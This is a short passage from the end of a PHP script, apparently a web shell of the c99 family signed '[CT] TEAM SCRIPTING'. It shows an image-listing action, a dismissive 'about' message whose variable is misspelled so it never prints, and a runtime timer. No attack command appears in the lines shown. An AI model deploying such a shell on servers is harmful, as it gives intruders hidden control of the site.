  $k = array_keys($arrimg);
  foreach ($k as $u)
  {
echo $u.":<img src=\"".$sul."act=img&img=".$u."\" border=\"1\"><br>";
  }
  echo "</center>";
 }
 exit;
}
if ($act == "about")
{
 $dàta = "Any stupid copyrights and copylefts";
 echo $data;
}

$microtime = round(getmicrotime()-$starttime,4);

?>
<? // [CT] TEAM SCRIPTING - RODNOC ?>
